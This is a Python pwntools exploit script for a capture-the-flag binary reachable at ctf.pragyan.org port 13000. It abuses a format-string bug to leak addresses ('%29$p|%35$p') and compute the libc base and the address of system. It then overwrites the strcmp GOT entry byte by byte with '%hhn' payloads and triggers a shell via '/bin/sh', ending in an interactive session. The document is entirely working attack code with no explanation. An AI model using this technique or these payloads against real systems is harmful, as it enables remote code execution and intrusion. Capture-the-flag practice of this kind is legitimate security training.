from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'

TARGET = './task'
HOST = 'ctf.pragyan.org'
PORT = 13000 

elf = ELF(TARGET)
def start():
    if not args.R:
        print "local"
        return process(TARGET)
        # return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
        # return process(TARGET, stdout=process.PTY, stdin=process.PTY)
    else:
        print "remote"
        return remote(HOST, PORT)

def get_base_address(proc):
    return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    script += "set $_base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print "\t-> %s: 0x%x" % (val, eval(val))

r = start()
if args.D:
    debug(r, [0x1483])

def create(name, leng, desc):
    r.sendlineafter('choice: ', '1')
    r.sendlineafter('name: ', name)
    r.sendlineafter('): ', '1')
    r.sendlineafter('tion: ', str(leng))
    r.sendlineafter('tion: ', desc)

def remove(name):
    r.sendlineafter('choice: ', '2')
    r.sendlineafter('remove: ', name)

def show():
    r.sendlineafter('choice: ', '3')


create('A', '12', '%29$p|%35$p') 
show()
r.recvuntil('Description: ')
r.recvuntil('|')
leak = int(r.recvuntil('\n')[:-1], 16)

base = leak - 0x18e81
system = base + 0x3cd10
dbg("base")
dbg("system")

for i in range(4):
    # remove('A')
    payload = ''
    c = (system >> (i*8) & 0xff)
    if c == 0:
        c = 256
    payload += '%'+str(c)
    payload += 'c%1$hhn'
    create('A', elf.got.strcmp+i, payload) 

show()
# create('Z', '9', "/bin/sh\x00")
create('Z', '9', "a")
remove('/bin/sh')
# remove('A') 
# payload = '' 
# payload += '%' + str(elf.got.free) + 'c%29$n'
# create('A', 100, payload) 



r.interactive()
r.close()
